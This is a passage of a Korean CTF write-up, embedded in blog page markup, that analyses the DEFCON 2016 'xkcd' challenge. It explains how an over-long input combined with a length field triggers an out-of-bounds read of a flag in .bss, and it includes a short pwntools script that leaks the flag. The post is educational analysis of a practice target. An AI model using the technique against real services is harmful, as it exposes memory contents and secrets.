url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAZCAIAAAC+dZmEAAAACXBIWXMAAAsTAAALEwEAmpwYAAADB0lEQVQ4y4VU2YobSwz1/39OPiHkNTE3kMy120vbvVV1d+27art4bGaIM7kRokCgwzlSSdpstxxj1zRwOEA/6cM0oEX3nWUsSJmEiL87YwCQv3xhm67T3lfOozY5p1py9T4CpFJqjLl+ZDmXWuu3b3Izjv50Mm2rTydPaTQWpPBS2hiLUrGU8pp/f2spN0/pFn79KjcIOWMCQA4hALiUACBJUY0qOecUgzVRiOpctjbfOd+ZKQXvC2MRIdH3K8bi0o8vR3xsyf7Ed0fSduKK9KGf8CohpFofzHdw9D4Og7xePULZmiKd7FXLHF01mxVljioQWCOskbXxmTnGOo76eqWMWUoN40xpRZjoRtcNAU3GA0hrIpTnhlEKSnlrQamKcXa2hBSYpcTSSc7CKil9SjmXkkt+BhMCpZb2XM8d26PD9+u/R9ztlwPSKABo0NSRWc+TGqW24almQiClTGnFOCyLZcxx7qR05fEv7/YW/MIcQtEa1jUOgxtHHVIQVjqXXvMemPLhkFAKzlWM4XoNbRuGAYx5wP5k72DGQIh6PKam8btdHAbPueHcrasWolKalQw+BeXsx7JTqkKEabLDoC8XxiSb6aqVl7IyloXwkKL14Y55lg1QxzH1vZsmf2mBi/inlfhA9rrW7bY0TcY4TpNRKtSa7z0qpfzS8d+ZjYlSBmNuoy94paQsc5WiQPjbShICzoGU2bhAtMRUY2InYjFTRFPldE7l/8C11vZcD2fe9G2HMJrZKphNmgdGDQ+v/OVtpWt5kp3Wtcw4s7UaC1QJpiX3AiD9RTbGXoiyEECLnxanvFkcJo6sdl0Fd+BDCj7d3phjzNFGGyC+naFwaeu5W4/o8qPbt3hsSUctizEhPc0GUUcXsyxmYZZxx3vZU6Ee4PbsCc1okSvTlNmFKqmtj8EEl3P2Lt8aVu61PuY8xfsNE5v9zhHqWJgl0Fi1KTQUabNkEcfqtIbbTf2o5u1Wbj5/XrZb9v0f9fJT73f27s3ONXu725mmMbvds7+86MvFffo0/wfo2pPCnjlxWgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/f3572d894a13fd37dbfff522cf8d4e93/90372/1.png\"\n        srcset=\"/static/f3572d894a13fd37dbfff522cf8d4e93/e9ff0/1.png 180w,\n/static/f3572d894a13fd37dbfff522cf8d4e93/f21e7/1.png 360w,\n/static/f3572d894a13fd37dbfff522cf8d4e93/90372/1.png 468w\"\n        sizes=\"(max-width: 468px) 100vw, 468px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>flag 파일의 내용을 읽어와 flag 변수에 집어넣는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 606px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA2klEQVQY03WMwY6CMBRF+f+vmaWJOgsZYhCTJkR2IyI0xYqlgAxQ+96rIZrMYjI3Z3PPTa7HWL3byc1GhKFMEp2mXV0/ug5KMR4zfSqaovipbpPWUNddUXxwbqSEsrTXq/U4zy8XluehEKxpztYiETnnjIFxtPhucxBhHIUxv8bL86MQUZYFnEdKpYgOYB61npQa+v4xTYBIADNEjogQ33hV9a11JKWv1H4YTs6513Hfm7adiAAR3T/xVqtkvf5aLD6Xy8D3kzi+x/H9cOi3WxUEtyjSjLUv+ZcnxJsUYnK/7U8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/c7e0df71fb22c6468f806646d2a22537/4d4a2/2.png\"\n        srcset=\"/static/c7e0df71fb22c6468f806646d2a22537/e9ff0/2.png 180w,\n/static/c7e0df71fb22c6468f806646d2a22537/f21e7/2.png 360w,\n/static/c7e0df71fb22c6468f806646d2a22537/4d4a2/2.png 606w\"\n        sizes=\"(max-width: 606px) 100vw, 606px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">flag 전역 변수</code></pre></div>\n<ul>\n<li>flag 변수는 .bss 섹션에 존재하며 전역 변수로 확인된다.</li>\n<li>사용자의 입력 값을 토대로 특정 조건을 수행하게 되는데 <code class=\"language-text\">strtok</code> 함수를 바탕으로 문자 단위로 짤라 해당 문자열이 포함되는 지를 확인하고 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">SERVER<span class=\"token punctuation\">,</span> ARE YOU STILL THERE<span class=\"token operator\">?</span>\n\nIF SO<span class=\"token punctuation\">,</span> REPLY \"</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 296px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY03WPTWvCQBiE/f8/RPAgouDJY6ARNqmxFsMeFDWhfsRkk+y7m+1+vWUplPbQYY7zzDCj40Hu95Cm3XbLdzueJIIQuV7zKHpkWff23r5sivj1I8vaPIcfUwpp2o8Q0XmvFEppOTenk7lczPlsKL0/n9JZZ1AYq7p2wL8SwgVYa8e5b1tT1/J2Y9drNQyfVaXKUve9Du02pK313zbGe4+MmQB774VAzh2ALUssCqTUMmabRiml8R+F5eNB5jkslzAei/kcFot6MumnU5jNIIoYITyOuySB1epBSEOp+P35C3BhExF8GT7yAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/6bb772078781b14a91141d3726fe538e/b1a44/3.png\"\n        srcset=\"/static/6bb772078781b14a91141d3726fe538e/e9ff0/3.png 180w,\n/static/6bb772078781b14a91141d3726fe538e/b1a44/3.png 296w\"\n        sizes=\"(max-width: 296px) 100vw, 296px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"strtok\" style=\"position:relative;\"><a href=\"#strtok\" aria-label=\"strtok permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>strtok</h2>\n<ul>\n<li>그후 해당 부분에서 <code class=\"language-text\">\"</code> 까지 잘라 해당 문자열의 값을 <code class=\"language-text\">globals</code> 전역 변수에 memcpy를 하는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 597px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAdklEQVQI1xXCWw6CMBAFUPa/B92FayB+EPiAKIkBNUErD1PKTTN12hnDycny/FuWtqps2/rr5fR4Hub5aMx5GAggwAI/IDoXx3G/LHGaGJCicFld37vu1ve9MR/nXkRvVQ0hAYFZmDUlERFmWde990KUVLVptj/N+27Tu6wEfQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/2ce07033ee502d0147643f29bd5e3fa5/17602/4.png\"\n        srcset=\"/static/2ce07033ee502d0147643f29bd5e3fa5/e9ff0/4.png 180w,\n/static/2ce07033ee502d0147643f29bd5e3fa5/f21e7/4.png 360w,\n/static/2ce07033ee502d0147643f29bd5e3fa5/17602/4.png 597w\"\n        sizes=\"(max-width: 597px) 100vw, 597px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"globals-전역-변수\" style=\"position:relative;\"><a href=\"#globals-%EC%A0%84%EC%97%AD-%EB%B3%80%EC%88%98\" aria-label=\"globals 전역 변수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>globals 전역 변수</h2>\n<ul>\n<li><code class=\"language-text\">globals</code> 전역 변수는 총 512바이트이며, 같은 .bss 영역이므로 앞에서 선언된 flag와는 0x200차이가 나는 것을 확인할 수있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 616px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAwElEQVQI102LMXLCMBBFff8bpM8NcgNXoXAKm86BEYMRtsGSDJJ2tLvWMhpS5M+b37z/q7oe2/a+35vj8a7U1+Xyebt9nE6/Wm/LMizL2YfNe3aOjWFrC8aw9zyOqdrtVN+fD4frNJkYO8RBRAASEsm/AMi6SoxCJG/jPVVd12j9o3Vr7RCC5FyEtTBap2cHEYk2kXJI6e+JWDaPB1VNUytVK/U9Tb1zgMjM+flMIRAAE+U365rnuXSMOYTMnK3FF9mX4R6RuuOwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/a66fd776c64ddf1016048ee1ef70b624/40040/5.png\"\n        srcset=\"/static/a66fd776c64ddf1016048ee1ef70b624/e9ff0/5.png 180w,\n/static/a66fd776c64ddf1016048ee1ef70b624/f21e7/5.png 360w,\n/static/a66fd776c64ddf1016048ee1ef70b624/40040/5.png 616w\"\n        sizes=\"(max-width: 616px) 100vw, 616px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>0x200 바이트 차이</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6UlEQVQY03WOTYuDMBCG/f+/p/S41I9sj0tPBQ8tVYvGRJOYGM3ExGIFcZftw8sc3pkHJjgcouMRpWnZdY5ze7t1WaZ+LtXl+sREsxba1jAGnNstjFkpp/tdBwhdz+eUUjG/YWyQ0hSFaJjWGpybAIxz07zD+2U2DQRx/BXHYVVVa0tIL4TJixE3g7F2L2xxbmkIWeQIoe+6JusRxorzsciHR0k73b81P/9mLSiFIEmiJEEY43VR14qQIc+VkKD1/C9/5GSTCekZH/NMlk8lxGitBYCPchie9jKlPalNSUWjWgPgvXef334B15WMo4wkAEoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/cd58e795091c689ea83dab4ecabbf93a/37523/6.png\"\n        srcset=\"/static/cd58e795091c689ea83dab4ecabbf93a/e9ff0/6.png 180w,\n/static/cd58e795091c689ea83dab4ecabbf93a/f21e7/6.png 360w,\n/static/cd58e795091c689ea83dab4ecabbf93a/37523/6.png 720w,\n/static/cd58e795091c689ea83dab4ecabbf93a/0955e/6.png 901w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"비교\" style=\"position:relative;\"><a href=\"#%EB%B9%84%EA%B5%90\" aria-label=\"비교 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>비교</h2>\n<ul>\n<li>strtok <code class=\"language-text\">(</code> <code class=\"language-text\">)</code> 한 내부의 특 정 정수 값을 바탕으로 <code class=\"language-text\">__isoc99_sscanf</code> 함수의 인자로 쓰이는 것을 확인할 수 있다.</li>\n<li>입력 받은후 <code class=\"language-text\">globals</code> 전역 변수의 길이 값과 <code class=\"language-text\">()</code> 내부에있는 값을 비교하여  <code class=\"language-text\">globals</code> 의 길이가 작을 경우 <code class=\"language-text\">()</code> 입력한 길이 만큼 출력을 한다.</li>\n<li>만약 더 큰 값을 입력했다면 <code class=\"language-text\">Nice Try</code>를 출력한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 463px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBUlEQVQY0zXN7U7CMBQA0L2JmIFssK7tXXt717IBlX2wScBINNEoGuZHou//28TE/yc5Qb392d99b3cf3f6zP3y1N++rzXPVnZt+aPrhujr55tU3p7obqvZtVb20/RlwX/pHck9B3T2Ufg0md2tPRamtQ7eQSOu61tap3Krcabso/UaiEdpkhsIovryajCMIfH2vyM0FSrRcUaqIK4oYmMWKAc6FZoApmIyKaSKo8IlEoW0YzS7GEByOA1oXMVBUSLRC51LbmKu89FwRA+QZ8YzQLeMUqPDpXxBGs9FEBrfHc9XtfN2nGf1rE6eAtkyEnvGMSWSAYNw0Edou50KxzIRRPJrAL24URLi3b+FYAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/b3fb4fb36506bf325dc0575af09e8cee/71ce0/7.png\"\n        srcset=\"/static/b3fb4fb36506bf325dc0575af09e8cee/e9ff0/7.png 180w,\n/static/b3fb4fb36506bf325dc0575af09e8cee/f21e7/7.png 360w,\n/static/b3fb4fb36506bf325dc0575af09e8cee/71ce0/7.png 463w\"\n        sizes=\"(max-width: 463px) 100vw, 463px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<ul>\n<li>어떻게 해당 flag 문자열 값을 읽어올 수 있을까?</li>\n<li><code class=\"language-text\">globals</code>, <code class=\"language-text\">flag</code> 전역 변수는 같은 .bss 섹션에 존재하며 <code class=\"language-text\">globals</code> 변수를 기준으로 0x200 바이트 차이가 난다.</li>\n<li>만약에 사용자가 0x200 바이트 이상의 값을 입력하게 된다면 해당 값은 <code class=\"language-text\">flag</code> 전역 변수와 붙게 될 것이고 널값이 존재 하지 않게되 <code class=\"language-text\">streln</code> 은 해당 길이 검사를 할때 널 값을 확인할 수 없어 <code class=\"language-text\">flag</code> 변수의 널 까지 읽게 되어 <code class=\"language-text\">globals+flag</code> 길이를 측적하게 될 것이다.</li>\n<li>그렇게 되면 <code class=\"language-text\">out-of-bound read</code> 취약점이 발생할 것이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ne <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./xkcd\"</span><span class=\"token punctuation\">)</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./xkcd\"</span><span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> <span class=\"token string\">'SERVER, ARE YOU STILL THERE? IF SO, REPLY \"%s\" (%d)'</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">512</span><span class=\"token punctuation\">,</span> <span class=\"token number\">512</span><span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>    \n    <span class=\"token keyword\">print</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 708px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0UlEQVQY03XM207DIAAAUH7EtetoC4VRLuXSAqOsasyyh2lisvis0fj/H2D8AJLzfEDIVxcu1r+4eFH2EdGZ60x4GNWq3FPTT/tOlYDllKY56CUYH5mcmh5jxjtyxIwTLqu238GuBPh01ksyPtmYhVkOiA7j1FE+jIoKXbe4gqgE+LRpvxqfbfxfIGKE654KwvVR2rolFRxKgIuzckY5oxcnrW56iBltB4QZoYLt4P7hUJeA7fk35q90/l63n5A+B/bGpzsT71zdpf7A9BWRW8kfe2ZCKeUkNAgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/b547b166c5b8f537383938fe8538dfef/3cb0f/8.png\"\n        srcset=\"/static/b547b166c5b8f537383938fe8538dfef/e9ff0/8.png 180w,\n/static/b547b166c5b8f537383938fe8538dfef/f21e7/8.png 360w,\n/static/b547b166c5b8f537383938fe8538dfef/3cb0f/8.png 708w\"\n        sizes=\"(max-width: 708px) 100vw, 708px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"flag\" style=\"position:relative;\"><a href=\"#flag\" aria-label=\"flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>flag</h2>\n<ul>\n<li>flag를 획득할 수 있다.</li>\n</ul>","frontmatter":{"date":"September 18, 2020","title":"DEFCON 2016 xkcd 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🧻"},"fields":{"slug":"/defcon2016_xkcd_ctf_writeup/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/defcon2016_feedme_ctf_writeup/","nextSlug":"/csaw_small_boi_ctf_writeup/","prevSlug":"/defcon2016_xkcd_ctf_writeup/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}